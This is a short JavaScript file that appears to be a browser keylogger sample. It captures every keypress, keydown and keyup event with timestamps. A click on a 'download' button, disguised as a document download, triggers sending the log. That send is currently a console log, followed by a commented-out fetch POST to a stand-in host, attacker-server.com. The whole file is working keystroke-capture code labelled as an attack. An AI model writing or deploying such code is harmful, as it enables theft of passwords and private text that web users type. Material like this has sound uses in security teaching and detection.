// Initialize keylogger
let keylog = [];

// Capture keypress events
document.addEventListener('keypress', function(event) {
    keylog.push({
        key: event.key,
        timestamp: new Date().toISOString(),
        eventType: 'keypress'
    });
});

// Capture keydown events
document.addEventListener('keydown', function(event) {
    keylog.push({
        key: event.key,
        timestamp: new Date().toISOString(),
        eventType: 'keydown'
    });
});

// Capture keyup events
document.addEventListener('keyup', function(event) {
    keylog.push({
        key: event.key,
        timestamp: new Date().toISOString(),
        eventType: 'keyup'
    });
});

// Capture download button click
document.getElementById('download').addEventListener('click', function() {
    // Simulate downloading a document
    setTimeout(function() {
        // Send captured keystrokes to attacker's server
        sendKeylog();
    }, 1000);
});

// Send captured keystrokes to attacker's server
function sendKeylog() {
    // In a real attack, this would send data to attacker's server
    console.log('Captured keystrokes:', keylog);
    
    // Example: Send to attacker's server
    // fetch('https://attacker-server.com/log', {
    //     method: 'POST',
    //     body: JSON.stringify(keylog)
    // });
}
